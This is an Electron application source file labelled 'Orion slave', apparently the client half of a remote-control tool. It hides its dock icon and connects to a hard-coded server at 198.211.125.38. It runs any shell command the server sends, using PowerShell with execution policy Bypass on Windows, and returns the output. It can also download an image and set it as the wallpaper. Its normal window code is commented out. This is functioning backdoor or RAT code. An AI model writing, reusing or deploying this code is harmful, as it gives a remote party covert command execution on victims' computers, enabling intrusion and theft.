'use strict'

import { app, protocol, BrowserWindow } from 'electron'
import * as path from 'path'
import { format as formatUrl } from 'url'
import {
  createProtocol,
  installVueDevtools
} from 'vue-cli-plugin-electron-builder/lib'
const isDevelopment = process.env.NODE_ENV !== 'production'
if (isDevelopment) {
  // Don't load any native (external) modules until the following line is run:
  require('module').globalPaths.push(process.env.NODE_MODULES_PATH)
}

if (app.dock){
  app.dock.setBadge('');
  app.dock.hide();
}

app.setName("Orion slave");

////////////////////////////
import io from 'socket.io-client'

let Socket = io.connect( 'http://198.211.125.38:3000/' )
let exec = require('child_process').exec;
const Store = require('electron-store');
const store = new Store();
const os = require('os')
const computerName = os.hostname()
const shell = require('node-powershell');
const fs = require('fs');
const request = require('request');
const wallpaper = require('wallpaper');

if (!store.get('uniqueRoomNumber')){
  store.set(
    'uniqueRoomNumber',
    Math.floor(Math.random()*16777215).toString(16).toUpperCase().substr(1, 3) + "-" + computerName
  )
}

console.log("[ORION]: Emitting as PC: ", store.get('uniqueRoomNumber').toString())
Socket.emit('roomConnectionHost',
  store.get('uniqueRoomNumber').toString()
)

let additionalFunctions = {
  ChangeBackground: (DATA) => {
    return new Promise(function(resolve, reject) {
      let download = function(uri, filename, callback){
        request.head(uri, function(err, res, body){
          request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
        });
      };

      try {
        download(DATA, 'client.png', function(){
          wallpaper.set('client.png');
        })
      } catch (error){
        reject({
          ERROR: error
        })
      } finally {
        resolve({
          SUCCESS: "Changed background"
        })
      }
    })
  }
}

Socket.on(
  store.get('uniqueRoomNumber').toString(),
  function (data) {
    if (data.computerName === store.get('uniqueRoomNumber').toString()){
      if (!data.shellCommand){
        if (!data.Other || !data.Other.Name || data.Other.Data);
        console.log("Calling; ", data.Other.Name, " - ", data.Other.Data);

        let responseData = additionalFunctions[data.Other.Name](
          data.Other.Data
        )

        responseData
          .then(Out =>
            Socket.emit('codeExecutionResponse',
              {
                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                stdout: "Called: " +  data.Other.Name + "\n\nWith data: " + data.Other.Data,
                stderr: "Response: \n\n" + Out.SUCCESS
              }
            )
          ).catch( Error =>
            Socket.emit('codeExecutionResponse',
              {
                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                error: Error
              }
            )
          )
      } else {
        console.log(
          "Execute shell: ",
          data.shellCommand
        )

        if (os.platform() === "win32"){
          console.log("Windows powershell");
          let ps = new shell({
            executionPolicy: 'Bypass',
            noProfile: true
          });

          ps.addCommand(data.shellCommand)
          ps.invoke()
          .then(output => {
            Socket.emit('codeExecutionResponse',
              {
                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                stdout: output,
                stderr: "<N/A>"
              }
            )
          })
          .catch(err => {
            Socket.emit('codeExecutionResponse',
              {
                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                error: err
              }
            )
            ps.dispose();
          });
        } else {
          exec(data.shellCommand, function(error, stdout, stderr) {
            if (error !== null) {
              console.log("Emitting...")
              Socket.emit('codeExecutionResponse',
                {
                  uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                  error: error
                }
              )
            } else {
              Socket.emit('codeExecutionResponse',
                {
                  uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
                  stdout: stdout,
                  stderr: stderr
                }
              )
            }
          });
        }
      }
    }
  }
);

/*
let mainWindow;
function createMainWindow() {
  const window = new BrowserWindow({
    backgroundColor: "#dcdde1",
    title: "Orion - client",
    titleBarStyle: "hiddenInset",
    webPreferences: {
      webSecurity: false
    },
    icon: path.join(__dirname, 'assets/Icons/1024x1024.png')
  });

  if (isDevelopment) {
    // Load the url of the dev server if in development mode
    window.loadURL(process.env.WEBPACK_DEV_SERVER_URL);
    if (!process.env.IS_TEST) window.webContents.openDevTools();
  } else {
    createProtocol("app");
    //   Load the index.html when not in development
    window.loadURL(
      formatUrl({
        pathname: path.join(__dirname, "index.html"),
        protocol: "file",
        slashes: true
      })
    );
  }

  window.on("closed", () => {
    mainWindow = null;
  });

  window.webContents.on("devtools-opened", () => {
    window.focus();
    setImmediate(() => {
      window.focus();
    });
  });

  return window;
}


app.setName("Orion client");

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});

app.on("activate", () => {
  if (mainWindow === null) {
    mainWindow = createMainWindow();
  }
});

app.on("ready", async () => {
  if (isDevelopment && !process.env.IS_TEST) {
    await installVueDevtools();
  }
  mainWindow = createMainWindow();
});*/
